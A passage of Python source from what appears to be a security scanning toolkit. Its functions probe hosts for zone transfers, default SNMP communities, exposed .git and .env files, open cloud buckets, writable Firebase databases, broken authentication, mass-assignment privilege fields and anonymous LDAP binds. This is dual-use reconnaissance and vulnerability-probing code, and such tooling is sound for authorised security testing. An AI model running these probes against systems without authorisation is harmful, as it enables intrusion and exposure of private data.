# ---------------------------------------------------------------------------
def ipv6_scan(subnet: str, log: Logger) -> list[dict]:
    """Discover live IPv6 hosts on a /64 using ICMPv6 neighbor solicitation
    (falls back to TCP connect on common ports if raw sockets not available)."""
    import socket as _socket

    log(f"[*] IPv6 host discovery on {subnet}", "cyan")
    # For practical purposes, try connecting to common ports
    hosts_found: list[dict] = []

    # Generate addresses to probe (link-local + common suffixes)
    base = subnet.rstrip("/").split("/")[0]
    suffixes = ["::1", "::2", "::a", "::f", "::100", "::dead:beef",
                "::1:1", "::ffff:1", "::cafe", "::d00d"]
    targets = []
    for s in suffixes:
        if "::" in base:
            targets.append(base.rsplit("::", 1)[0] + s)
        else:
            targets.append(base + s)
    targets.append(base)

    for addr in targets:
        if _should_stop():
            break
        for port in (80, 443, 22, 445):
            sock = None
            try:
                sock = _socket.socket(_socket.AF_INET6, _socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((addr, port))
                log(f"[+] {addr} — port {port} open", "ok")
                hosts_found.append({"address": addr, "port": port})
                break
            except OSError:
                pass
            finally:
                if sock:
                    sock.close()

    log(f"[*] {len(hosts_found)} IPv6 host(s) responded", "cyan")
    return hosts_found


# ---------------------------------------------------------------------------
# 8. DNS Zone Transfer (AXFR)
# ---------------------------------------------------------------------------
def dns_axfr(domain: str, log: Logger) -> list[str]:
    """Attempt a DNS zone transfer on the domain's nameservers."""
    import socket as _socket

    log(f"[*] DNS zone transfer (AXFR) attempt on {domain}", "cyan")
    records: list[str] = []

    # First resolve NS records
    try:
        import dns.resolver
        import dns.zone
        import dns.query
        HAS_DNSPYTHON = True
    except ImportError:
        HAS_DNSPYTHON = False

    if HAS_DNSPYTHON:
        try:
            ns_records = dns.resolver.resolve(domain, "NS")
            nameservers = [str(r.target).rstrip(".") for r in ns_records]
        except Exception as exc:
            log(f"[-] NS lookup failed: {exc}", "err")
            return []

        for ns in nameservers:
            if _should_stop():
                break
            log(f"  Trying AXFR on {ns}...", "info")
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(ns, domain, timeout=REQUEST_TIMEOUT))
                for name, node in zone.nodes.items():
                    record_str = f"{name}.{domain}"
                    records.append(record_str)
                    log(f"[+] {record_str}", "ok")
                log(f"[!] Zone transfer SUCCESSFUL on {ns}! ({len(records)} records)", "err")
                break
            except Exception as exc:
                log(f"  [-] {ns}: {exc}", "muted")
    else:
        # Fallback: raw socket AXFR attempt
        log("[!] dnspython not installed — using basic AXFR probe", "warn")
        try:
            ns_addrs = _socket.getaddrinfo(domain, 53)
            ns_ip = ns_addrs[0][4][0] if ns_addrs else None
        except _socket.gaierror:
            ns_ip = None
        if ns_ip:
            # Build minimal AXFR query
            import struct as _struct
            txid = secrets.token_bytes(2)
            labels = domain.split(".")
            qname = b""
            for label in labels:
                qname += bytes([len(label)]) + label.encode()
            qname += b"\x00"
            query = txid + b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            query += qname + b"\x00\xfc\x00\x01"  # AXFR, IN
            length = _struct.pack("!H", len(query))
            sock = None
            try:
                sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((ns_ip, 53))
                sock.sendall(length + query)
                resp = sock.recv(4096)
                if len(resp) > 14:
                    log(f"[+] Received {len(resp)} bytes — zone transfer may be possible", "warn")
                    records.append(f"raw_response_{len(resp)}_bytes")
                else:
                    log("[-] Zone transfer refused", "ok")
            except OSError as exc:
                log(f"[-] {exc}", "muted")
            finally:
                if sock:
                    sock.close()

    if not records:
        log("[+] Zone transfer refused on all nameservers (good)", "ok")
    return records


# ---------------------------------------------------------------------------
# 9. SNMP Walker
# ---------------------------------------------------------------------------
SNMP_COMMUNITIES = ["public", "private", "community", "snmp", "default",
                    "admin", "monitor", "read", "write", "cisco", "secret"]


def snmp_walk(host: str, community: str, log: Logger) -> list[dict]:
    """Enumerate SNMP OIDs using common community strings."""
    import socket as _socket

    if not community:
        communities = SNMP_COMMUNITIES
    else:
        communities = [community]

    log(f"[*] SNMP walk on {host} ({len(communities)} community string(s))", "cyan")
    results: list[dict] = []

    def build_snmp_get(comm: str, oid: bytes = b"\x2b\x06\x01\x02\x01\x01\x01\x00") -> bytes:
        """Build a minimal SNMPv1 GET-REQUEST for sysDescr."""
        comm_bytes = comm.encode()
        # OID: 1.3.6.1.2.1.1.1.0 (sysDescr)
        varbind = b"\x30" + bytes([len(oid) + 4]) + b"\x06" + bytes([len(oid)]) + oid + b"\x05\x00"
        varbind_list = b"\x30" + bytes([len(varbind)]) + varbind
        request_id = b"\x02\x01\x01"
        error = b"\x02\x01\x00"
        error_idx = b"\x02\x01\x00"
        pdu_content = request_id + error + error_idx + varbind_list
        pdu = b"\xa0" + bytes([len(pdu_content)]) + pdu_content
        version = b"\x02\x01\x00"  # SNMPv1
        community_tlv = b"\x04" + bytes([len(comm_bytes)]) + comm_bytes
        message_content = version + community_tlv + pdu
        message = b"\x30" + bytes([len(message_content)]) + message_content
        return message

    for comm in communities:
        if _should_stop():
            break
        try:
            sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
            sock.settimeout(3)
            packet = build_snmp_get(comm)
            sock.sendto(packet, (host, 161))
            data, _ = sock.recvfrom(4096)
            # If we got a response, community string is valid
            log(f"[+] Community '{comm}' — {len(data)} bytes response", "ok")
            # Try to extract sysDescr string
            desc = ""
            try:
                # Find the octet string in response
                idx = data.find(b"\x04", 20)
                if idx > 0 and idx + 1 < len(data):
                    slen = data[idx + 1]
                    desc = data[idx + 2:idx + 2 + slen].decode("utf-8", errors="replace")
            except Exception as exc:
                log(f"  [-] {exc}", "muted")
            if desc:
                log(f"    sysDescr: {desc[:200]}", "info")
            results.append({"community": comm, "response_len": len(data),
                            "sysDescr": desc})
        except _socket.timeout:
            log(f"  '{comm}' — no response", "muted")
        except OSError as exc:
            log(f"  '{comm}' — {exc}", "muted")
        finally:
            try:
                sock.close()
            except Exception as exc:
                log(f"  [-] {exc}", "muted")

    log(f"[*] {len(results)} valid community string(s)", "warn" if results else "ok")
    return results


# ---------------------------------------------------------------------------
# 10. ARP Spoofing Detector
# ---------------------------------------------------------------------------
def arp_spoof_detect(interface: str, log: Logger) -> list[dict]:
    """Detect ARP spoofing by checking for duplicate MAC-to-IP mappings
    in the local ARP table."""
    import subprocess

    log("[*] ARP spoofing detection — reading ARP table", "cyan")
    conflicts: list[dict] = []

    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=REQUEST_TIMEOUT)
        lines = result.stdout.splitlines()
    except (OSError, subprocess.TimeoutExpired) as exc:
        log(f"[-] {exc}", "err")
        return []

    # Parse ARP table: IP → MAC mapping
    ip_to_mac: dict[str, str] = {}
    mac_to_ips: dict[str, list[str]] = {}

    for line in lines:
        parts = line.split()
        if len(parts) >= 3:
            # Windows format: IP   MAC   type
            ip_candidate = parts[0].strip("()")
            mac_candidate = ""
            for p in parts[1:]:
                if re.match(r"([0-9a-f]{2}[:-]){2,5}[0-9a-f]{2}", p, re.I):
                    mac_candidate = p.lower().replace("-", ":")
                    break
            if mac_candidate and re.match(r"\d+\.\d+\.\d+\.\d+", ip_candidate):
                ip_to_mac[ip_candidate] = mac_candidate
                mac_to_ips.setdefault(mac_candidate, []).append(ip_candidate)

    log(f"  Found {len(ip_to_mac)} ARP entries", "info")

    # Check for one MAC serving multiple IPs (potential spoofing)
    for mac, ips in mac_to_ips.items():
        if len(ips) > 1 and mac != "ff:ff:ff:ff:ff:ff":
            log(f"[!] MAC {mac} → {', '.join(ips)} (potential ARP spoof!)", "err")
            conflicts.append({"mac": mac, "ips": ips})

    if not conflicts:
        log("[+] No ARP conflicts detected", "ok")
    else:
        log(f"[!] {len(conflicts)} potential ARP spoofing conflict(s)", "warn")
    return conflicts


# ---------------------------------------------------------------------------
# 11. Swagger / OpenAPI Discovery
# ---------------------------------------------------------------------------
SWAGGER_PATHS = [
    "swagger.json", "swagger/v1/swagger.json", "swagger/v2/swagger.json",
    "api-docs", "api-docs.json", "v2/api-docs", "v3/api-docs",
    "openapi.json", "openapi.yaml", "openapi/v3/api-docs",
    "api/swagger.json", "api/openapi.json", "api/docs",
    "docs", "docs/api", "redoc", "graphql/schema",
    "_api/swagger.json", "api/v1/docs", "api/v2/docs",
    "swagger-ui.html", "swagger-resources",
    "actuator", "actuator/env", "actuator/health",
    ".well-known/openapi.yaml",
]


def swagger_discovery(url: str, log: Logger) -> list[dict]:
    """Brute-force common API documentation paths."""
    import requests
    from urllib.parse import urljoin

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/") + "/"
    log(f"[*] Swagger/OpenAPI discovery on {url} ({len(SWAGGER_PATHS)} paths)", "cyan")
    found: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    for path in SWAGGER_PATHS:
        if _should_stop():
            break
        target = urljoin(url, path)
        try:
            resp = sess.get(target, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        except requests.RequestException:
            continue
        if resp.status_code == 200:
            ct = resp.headers.get("Content-Type", "")
            body_preview = resp.text[:500]
            is_api_doc = any(k in body_preview.lower() for k in
                            ("swagger", "openapi", "paths", "info", "endpoints",
                             "actuator", "schemas"))
            if is_api_doc or "json" in ct or "yaml" in ct:
                log(f"[+] {target} [{resp.status_code}] — API doc detected!", "err")
                found.append({"url": target, "content_type": ct,
                              "preview": body_preview[:200]})
            else:
                log(f"  {target} [{resp.status_code}] — not API doc", "muted")

    log(f"[*] {len(found)} API documentation endpoint(s) found", "warn" if found else "ok")
    sess.close()
    return found


# ---------------------------------------------------------------------------
# 12. Broken Auth Tester (IDOR / Missing Auth)
# ---------------------------------------------------------------------------
def broken_auth_test(url: str, valid_token: str, log: Logger) -> dict:
    """Test an endpoint for broken authentication:
    - No token
    - Invalid token
    - Different user's token (if provided)
    """
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    log(f"[*] Broken auth test on {url}", "cyan")
    results: dict = {"url": url, "tests": []}
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    # Test 1: No auth
    try:
        resp = sess.get(url, timeout=REQUEST_TIMEOUT)
        no_auth = {"test": "no_token", "status": resp.status_code,
                   "length": len(resp.content)}
        if resp.status_code == 200:
            log("[!] No auth → HTTP 200 (possible broken auth!)", "err")
            no_auth["vulnerable"] = True
        else:
            log(f"  No auth → HTTP {resp.status_code}", "info")
            no_auth["vulnerable"] = False
        results["tests"].append(no_auth)
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")

    # Test 2: Invalid token
    for header_name in ("Authorization", "X-API-Key", "Cookie"):
        if _should_stop():
            break
        try:
            resp = sess.get(url, timeout=REQUEST_TIMEOUT,
                            headers={header_name: "invalid_token_12345"})
            test = {"test": f"invalid_{header_name}", "status": resp.status_code,
                    "length": len(resp.content)}
            if resp.status_code == 200:
                log(f"[!] Invalid {header_name} → HTTP 200 (broken auth!)", "err")
                test["vulnerable"] = True
            else:
                log(f"  Invalid {header_name} → HTTP {resp.status_code}", "info")
                test["vulnerable"] = False
            results["tests"].append(test)
        except requests.RequestException:
            pass

    # Test 3: With valid token (baseline)
    if valid_token:
        try:
            resp = sess.get(url, timeout=REQUEST_TIMEOUT,
                            headers={"Authorization": f"Bearer {valid_token}"})
            log(f"  Valid token → HTTP {resp.status_code} ({len(resp.content)} bytes)", "info")
            results["baseline"] = {"status": resp.status_code,
                                   "length": len(resp.content)}
        except requests.RequestException:
            pass

    vuln_count = sum(1 for t in results["tests"] if t.get("vulnerable"))
    log(f"[*] {vuln_count} broken auth indicator(s)", "warn" if vuln_count else "ok")
    sess.close()
    return results


# ---------------------------------------------------------------------------
# 13. Mass Assignment Scanner
# ---------------------------------------------------------------------------
MASS_ASSIGN_FIELDS = [
    "role", "admin", "isAdmin", "is_admin", "is_superuser", "superuser",
    "verified", "is_verified", "email_verified", "active", "is_active",
    "permissions", "privilege", "level", "group", "groups", "scope",
    "type", "user_type", "account_type", "tier", "plan", "credit",
    "balance", "discount", "free_trial", "approved", "status",
]


def mass_assignment_test(url: str, method: str, base_body: str,
                         log: Logger) -> list[dict]:
    """Send extra fields (role=admin etc.) and check if they're accepted."""
    import requests
    import json

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    method = (method or "POST").upper()
    log(f"[*] Mass assignment test on {url} ({len(MASS_ASSIGN_FIELDS)} fields)", "cyan")
    findings: list[dict] = []

    # Parse base body as JSON if possible
    try:
        body_dict = json.loads(base_body) if base_body else {}
        is_json = True
    except (json.JSONDecodeError, TypeError):
        body_dict = {}
        is_json = False

    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    # Baseline request
    try:
        if is_json:
            sess.headers["Content-Type"] = "application/json"
            baseline = sess.request(method, url, json=body_dict, timeout=REQUEST_TIMEOUT)
        else:
            baseline = sess.request(method, url, data=base_body or "", timeout=REQUEST_TIMEOUT)
        baseline_status = baseline.status_code
        baseline_len = len(baseline.content)
    except requests.RequestException as exc:
        log(f"[-] Baseline failed: {exc}", "err")
        return []

    log(f"  Baseline: HTTP {baseline_status} ({baseline_len} bytes)", "info")

    for field in MASS_ASSIGN_FIELDS:
        if _should_stop():
            break
        test_body = dict(body_dict)
        test_body[field] = True  # or "admin"

        try:
            if is_json:
                resp = sess.request(method, url, json=test_body, timeout=REQUEST_TIMEOUT)
            else:
                resp = sess.request(method, url, data=test_body, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue

        # If server accepts the extra field without error
        if resp.status_code in (200, 201, 204):
            # Check if response differs from baseline
            if abs(len(resp.content) - baseline_len) > 50 or \
               resp.status_code != baseline_status:
                log(f"[+] Field '{field}' accepted with different response!", "err")
                findings.append({"field": field, "status": resp.status_code,
                                 "diff_len": len(resp.content) - baseline_len})
            else:
                log(f"  '{field}' — accepted but same response", "muted")
        elif resp.status_code == 422:
            log(f"  '{field}' — validation error (field recognized?)", "warn")
            findings.append({"field": field, "status": 422, "note": "recognized"})

    log(f"[*] {len(findings)} potential mass-assignment field(s)", "warn" if findings else "ok")
    sess.close()
    return findings


# ---------------------------------------------------------------------------
# 14. Rate Limit Tester
# ---------------------------------------------------------------------------
def rate_limit_test(url: str, count: int, log: Logger) -> dict:
    """Send N rapid requests and detect if rate limiting is applied."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    count = max(10, min(500, count))
    log(f"[*] Rate limit test: {count} requests to {url}", "cyan")

    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    statuses: list[int] = []
    blocked_at: int | None = None

    for i in range(count):
        if _should_stop():
            break
        try:
            resp = sess.get(url, timeout=REQUEST_TIMEOUT)
            statuses.append(resp.status_code)
            if resp.status_code == 429:
                if blocked_at is None:
                    blocked_at = i + 1
                    log(f"[+] Rate limited at request #{i+1} (HTTP 429)", "ok")
                    retry_after = resp.headers.get("Retry-After", "not specified")
                    log(f"  Retry-After: {retry_after}", "info")
            elif resp.status_code in (403, 503) and i > 5:
                if blocked_at is None:
                    blocked_at = i + 1
                    log(f"[+] Blocked at request #{i+1} (HTTP {resp.status_code})", "ok")
        except requests.RequestException:
            statuses.append(0)

    rate_limited = blocked_at is not None
    if not rate_limited:
        log(f"[!] No rate limiting detected after {len(statuses)} requests!", "warn")
    else:
        log(f"[+] Rate limiting kicks in at request #{blocked_at}", "ok")

    sess.close()
    return {"total_sent": len(statuses), "rate_limited": rate_limited,
            "blocked_at": blocked_at,
            "status_distribution": {s: statuses.count(s) for s in set(statuses)}}


# ---------------------------------------------------------------------------
# 15. Cipher Suite Grader
# ---------------------------------------------------------------------------
def cipher_suite_grade(host: str, port: int, log: Logger) -> dict:
    """Analyze TLS cipher suites and assign a security grade."""
    import ssl
    import socket as _socket

    port = port or 443
    log(f"[*] TLS cipher suite analysis: {host}:{port}", "cyan")

    WEAK_CIPHERS = {"RC4", "DES", "3DES", "NULL", "EXPORT", "MD5", "anon"}
    GOOD_CIPHERS = {"AES256-GCM", "CHACHA20", "AES128-GCM"}

    results: dict = {"host": host, "port": port, "ciphers": [], "grade": "?"}

    sock = None
    ssock = None
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("ALL:COMPLEMENTOFALL")
        sock = _socket.create_connection((host, port), timeout=REQUEST_TIMEOUT)
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        negotiated = ssock.cipher()
        all_ciphers = ctx.get_ciphers()
    except Exception as exc:
        log(f"[-] {exc}", "err")
        return results
    finally:
        if ssock:
            ssock.close()
        elif sock:
            sock.close()

    log(f"  Negotiated: {negotiated[0]} ({negotiated[2]} bits)", "info")
    results["negotiated"] = {"name": negotiated[0], "protocol": negotiated[1],
                             "bits": negotiated[2]}

    weak_found = []
    strong_found = []
    for c in all_ciphers:
        name = c.get("name", "")
        if any(w in name.upper() for w in WEAK_CIPHERS):
            weak_found.append(name)
        elif any(g in name.upper() for g in GOOD_CIPHERS):
            strong_found.append(name)

    # Grading
    if not weak_found and strong_found:
        grade = "A"
    elif not weak_found:
        grade = "B"
    elif len(weak_found) <= 2:
        grade = "C"
    elif len(weak_found) <= 5:
        grade = "D"
    else:
        grade = "F"

    results["grade"] = grade
    results["weak"] = weak_found
    results["strong"] = strong_found

    if weak_found:
        log(f"[!] {len(weak_found)} weak cipher(s):", "warn")
        for c in weak_found[:10]:
            log(f"    {c}", "err")
    if strong_found:
        log(f"[+] {len(strong_found)} strong cipher(s) available", "ok")
    log(f"[*] Grade: {grade}", "cyan" if grade in ("A", "B") else "warn")
    return results


# ---------------------------------------------------------------------------
# 16. RSA Key Analyzer
# ---------------------------------------------------------------------------
def rsa_key_analyze(key_text: str, log: Logger) -> dict:
    """Analyze an RSA public key for weaknesses."""
    import math

    log("[*] RSA key analysis", "cyan")
    results: dict = {"issues": []}

    # Try to parse the key
    try:
        # Remove PEM headers
        lines = [l for l in key_text.splitlines()
                 if not l.startswith("-----")]
        b64_data = "".join(lines)
        der = base64.b64decode(b64_data)
    except Exception as exc:
        log(f"[-] Failed to decode key: {exc}", "err")
        return results

    # Extract modulus (simplified DER parsing for RSA)
    # Look for large integers
    n = None
    e = None
    try:
        # Attempt to use cryptography library
        from cryptography.hazmat.primitives.serialization import load_pem_public_key
        key_bytes = key_text.encode()
        pub_key = load_pem_public_key(key_bytes)
        numbers = pub_key.public_numbers()
        n = numbers.n
        e = numbers.e
    except ImportError:
        log("[!] 'cryptography' library not installed — limited analysis", "warn")
        # Try basic extraction from DER
        # Just check key size from the DER length
        key_bits = (len(der) - 38) * 8  # rough estimate (DER overhead ~38 bytes)
        results["estimated_bits"] = key_bits
        if key_bits < 2048:
            results["issues"].append("Key appears shorter than 2048 bits")
            log("[!] Key appears shorter than 2048 bits", "err")
    except Exception as exc:
        log(f"[-] Key parsing error: {exc}", "err")
        return results

    if n is not None and e is not None:
        bit_length = n.bit_length()
        results["bit_length"] = bit_length
        results["exponent"] = e
        log(f"  Modulus: {bit_length} bits", "info")
        log(f"  Exponent: {e}", "info")

        # Check 1: Key size
        if bit_length < 2048:
            results["issues"].append(f"Weak key size: {bit_length} bits (minimum 2048)")
            log(f"[!] Weak key size: {bit_length} bits", "err")
        elif bit_length < 3072:
            log(f"[~] Key size OK for now ({bit_length}), 3072+ recommended", "warn")

        # Check 2: Small exponent
        if e == 1:
            results["issues"].append("Exponent is 1 (trivial)")
            log("[!] Exponent = 1 — trivially broken!", "err")
        elif e < 65537:
            results["issues"].append(f"Small exponent: {e}")
            log(f"[!] Small exponent ({e}) — may be vulnerable to attacks", "warn")

        # Check 3: Fermat factorization (for close primes)
        if bit_length <= 512:
            log("  Attempting Fermat factorization...", "info")
            a = math.isqrt(n) + 1
            for i in range(100000):
                if i % 10000 == 0 and _should_stop():
                    break
                b2 = a * a - n
                b = math.isqrt(b2)
                if b * b == b2:
                    p = a + b
                    q = a - b
                    results["factored"] = True
                    results["issues"].append(f"FACTORED! p={p}, q={q}")
                    log(f"[!] KEY FACTORED: p={p}, q={q}", "err")
                    break
                a += 1
            else:
                log("  Fermat: not easily factorable", "ok")

    if not results["issues"]:
        log("[+] No obvious weaknesses found", "ok")
    else:
        log(f"[!] {len(results['issues'])} issue(s) found", "warn")
    return results


# ---------------------------------------------------------------------------
# 17. Certificate Transparency Monitor
# ---------------------------------------------------------------------------
def ct_monitor(domain: str, log: Logger) -> list[dict]:
    """Query Certificate Transparency logs for recent certificates."""
    import requests
    log(f"[*] CT log query for {domain}", "cyan")
    certs: list[dict] = []

    # Use crt.sh API
    try:
        resp = requests.get(
            f"https://crt.sh/?q=%25.{domain}&output=json",
            timeout=20, headers={"User-Agent": random_ua()})
        if resp.status_code != 200:
            log(f"[-] crt.sh returned HTTP {resp.status_code}", "err")
            return []
        data = resp.json()
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return []
    except ValueError:
        log("[-] Invalid JSON from crt.sh", "err")
        return []

    # Show most recent certs
    seen_names: set[str] = set()
    for entry in sorted(data, key=lambda x: x.get("id", 0), reverse=True)[:50]:
        if _should_stop():
            break
        name = entry.get("name_value", "")
        issuer = entry.get("issuer_name", "")
        not_before = entry.get("not_before", "")
        if name in seen_names:
            continue
        seen_names.add(name)
        certs.append({"name": name, "issuer": issuer, "not_before": not_before})
        log(f"  {not_before}  {name}  (issuer: {issuer[:50]})", "info")

    log(f"[*] {len(certs)} unique certificate(s) found", "cyan")

    # Flag wildcards and suspicious patterns
    wildcards = [c for c in certs if "*" in c["name"]]
    if wildcards:
        log(f"[!] {len(wildcards)} wildcard cert(s) detected", "warn")

    return certs


# ---------------------------------------------------------------------------
# 18. S3 Bucket Enumerator
# ---------------------------------------------------------------------------
def s3_bucket_enum(domain: str, log: Logger) -> list[dict]:
    """Try common S3 bucket name variations derived from the domain."""
    import requests
    base = domain.replace(".", "-").replace("www-", "")
    parts = domain.split(".")
    company = parts[0] if parts[0] != "www" else (parts[1] if len(parts) > 1 else parts[0])

    bucket_names = [
        company, f"{company}-backup", f"{company}-bak", f"{company}-dev",
        f"{company}-staging", f"{company}-prod", f"{company}-assets",
        f"{company}-uploads", f"{company}-data", f"{company}-logs",
        f"{company}-static", f"{company}-media", f"{company}-files",
        f"{company}-public", f"{company}-private", f"{company}-internal",
        f"{company}-test", f"{company}-temp", f"{company}-archive",
        base, f"{base}-backup", f"{base}-dev", f"{base}-assets",
    ]

    log(f"[*] S3 bucket enumeration ({len(bucket_names)} variations)", "cyan")
    found: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    for name in bucket_names:
        if _should_stop():
            break
        url = f"https://{name}.s3.amazonaws.com"
        try:
            resp = sess.get(url, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue

        if resp.status_code == 200:
            log(f"[+] {url} — PUBLIC (listable!)", "err")
            found.append({"bucket": name, "url": url, "status": "public",
                          "preview": resp.text[:300]})
        elif resp.status_code == 403:
            log(f"[~] {url} — exists but access denied", "warn")
            found.append({"bucket": name, "url": url, "status": "exists_private"})
        elif resp.status_code == 301:
            log(f"[~] {url} — redirected (different region)", "info")
            found.append({"bucket": name, "url": url, "status": "redirect"})

    log(f"[*] {len(found)} bucket(s) found", "warn" if found else "ok")
    sess.close()
    return found


# ---------------------------------------------------------------------------
# 19. Azure Blob Checker
# ---------------------------------------------------------------------------
def azure_blob_check(domain: str, log: Logger) -> list[dict]:
    """Check for publicly accessible Azure Blob Storage containers."""
    import requests
    company = domain.split(".")[0]
    if company == "www" and len(domain.split(".")) > 1:
        company = domain.split(".")[1]

    account_names = [company, f"{company}storage", f"{company}data",
                     f"{company}blob", f"{company}files", f"{company}backup"]
    containers = ["$web", "public", "uploads", "data", "backup", "assets",
                  "media", "files", "images", "documents", "logs"]

    log(f"[*] Azure Blob check ({len(account_names)}×{len(containers)} combinations)", "cyan")
    found: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    for account in account_names:
        if _should_stop():
            break
        for container in containers:
            if _should_stop():
                break
            url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
            try:
                resp = sess.get(url, timeout=REQUEST_TIMEOUT)
            except requests.RequestException:
                continue
            if resp.status_code == 200 and "EnumerationResults" in resp.text:
                log(f"[+] {account}/{container} — PUBLIC (listable!)", "err")
                found.append({"account": account, "container": container,
                              "url": url, "status": "public"})
            elif resp.status_code == 404:
                pass  # doesn't exist
            elif resp.status_code == 409:
                log(f"[~] {account}/{container} — exists (access denied)", "info")

    log(f"[*] {len(found)} accessible container(s)", "warn" if found else "ok")
    sess.close()
    return found


# ---------------------------------------------------------------------------
# 20. Git Exposure Checker
# ---------------------------------------------------------------------------
GIT_PATHS = [
    ".git/HEAD", ".git/config", ".git/index", ".git/COMMIT_EDITMSG",
    ".git/description", ".git/info/refs", ".git/packed-refs",
    ".git/logs/HEAD", ".git/refs/heads/main", ".git/refs/heads/master",
    ".gitignore", ".env", ".env.local", ".env.production",
]


def git_exposure_check(url: str, log: Logger) -> list[dict]:
    """Check if .git directory is exposed on a web server."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/") + "/"
    log(f"[*] Git exposure check on {url}", "cyan")
    found: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    for path in GIT_PATHS:
        if _should_stop():
            break
        target = url + path
        try:
            resp = sess.get(target, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue

        if resp.status_code == 200 and len(resp.content) > 0:
            content = resp.text[:500]
            # Validate it's actually git content
            is_git = False
            if path == ".git/HEAD" and "ref:" in content:
                is_git = True
            elif path == ".git/config" and "[core]" in content:
                is_git = True
            elif path == ".git/index" and resp.content[:4] == b"DIRC":
                is_git = True
            elif path.startswith(".env") and "=" in content:
                is_git = True
            elif "commit" in content or "tree" in content or "ref" in content:
                is_git = True

            if is_git:
                log(f"[+] {target} — EXPOSED!", "err")
                log(f"    Preview: {content[:100]}", "info")
                found.append({"path": path, "url": target,
                              "preview": content[:200]})

    if found:
        log(f"[!] {len(found)} sensitive file(s) exposed — source code leak!", "err")
    else:
        log("[+] No git exposure detected", "ok")
    sess.close()
    return found


# ---------------------------------------------------------------------------
# 21. Firebase DB Scanner
# ---------------------------------------------------------------------------
def firebase_scan(target: str, log: Logger) -> dict:
    """Check if a Firebase Realtime Database has open read rules."""
    import requests
    # Normalize to Firebase URL
    if ".firebaseio.com" not in target:
        target = f"https://{target}.firebaseio.com"
    if not target.startswith("http"):
        target = "https://" + target
    target = target.rstrip("/")

    log(f"[*] Firebase open-rules check: {target}", "cyan")
    results: dict = {"url": target, "readable": False, "writable": False}

    # Test read
    try:
        resp = requests.get(f"{target}/.json", timeout=REQUEST_TIMEOUT,
                            headers={"User-Agent": random_ua()})
        if resp.status_code == 200:
            data = resp.json() if resp.text.strip() else None
            if data is not None:
                log(f"[!] Database is READABLE! ({len(resp.text)} bytes)", "err")
                log(f"    Preview: {resp.text[:200]}", "info")
                results["readable"] = True
                results["data_size"] = len(resp.text)
            else:
                log("[+] Readable but empty", "warn")
                results["readable"] = True
        elif resp.status_code == 401:
            log("[+] Read access denied (rules configured)", "ok")
        else:
            log(f"  HTTP {resp.status_code}", "info")
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")

    # Test write (with harmless probe)
    try:
        resp = requests.put(
            f"{target}/_penetrator_test/.json",
            json={"test": True}, timeout=REQUEST_TIMEOUT,
            headers={"User-Agent": random_ua()})
        if resp.status_code == 200:
            log("[!] Database is WRITABLE! (critical!)", "err")
            results["writable"] = True
            # Clean up
            requests.delete(f"{target}/_penetrator_test/.json", timeout=5)
        elif resp.status_code == 401:
            log("[+] Write access denied", "ok")
    except requests.RequestException:
        pass

    return results


# ---------------------------------------------------------------------------
# 22. LDAP Anonymous Bind
# ---------------------------------------------------------------------------
def ldap_anonymous_check(host: str, port: int, log: Logger) -> dict:
    """Test if LDAP server allows anonymous binding."""
    import socket as _socket

    port = port or 389
    log(f"[*] LDAP anonymous bind test: {host}:{port}", "cyan")
    results: dict = {"host": host, "port": port, "anonymous_bind": False, "entries": []}

    try:
        # Try using ldap3 if available
        import ldap3
        server = ldap3.Server(host, port=port, get_info=ldap3.DSA)
        conn = ldap3.Connection(server, auto_bind=True)
        log("[+] Anonymous bind SUCCESSFUL!", "err")
        results["anonymous_bind"] = True

        # Try to enumerate
        try:
            conn.search("", "(objectClass=*)", search_scope=ldap3.BASE,
                        attributes=["*"])
            if conn.entries:
                for entry in conn.entries[:10]:
                    log(f"  {entry.entry_dn}", "info")
                    results["entries"].append(str(entry.entry_dn))
        except Exception as exc:
            log(f"  [-] {exc}", "muted")

        # Try common base DNs
        for base in ["dc=local", "dc=corp", "dc=domain", "dc=company"]:
            try:
                conn.search(base, "(objectClass=person)",
                            search_scope=ldap3.SUBTREE,
                            attributes=["cn", "mail", "sAMAccountName"],
                            size_limit=20)
                if conn.entries:
                    log(f"[+] Found {len(conn.entries)} entries under {base}", "err")
                    for entry in conn.entries[:5]:
                        log(f"    {entry}", "info")
                        results["entries"].append(str(entry))
                    break
            except Exception as exc:
                log(f"  [-] {exc}", "muted")
        conn.unbind()
    except ImportError:
        # Fallback: raw socket
        log("[!] ldap3 not installed — basic TCP probe only", "warn")
        sock = None
        try:
            sock = _socket.create_connection((host, port), timeout=REQUEST_TIMEOUT)
            # Send minimal LDAP bind request (anonymous)
            bind_request = (
                b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00"
            )
            sock.sendall(bind_request)
            sock.settimeout(5)
            resp = sock.recv(1024)
            if resp and b"\x61" in resp[:5]:
                # Check result code
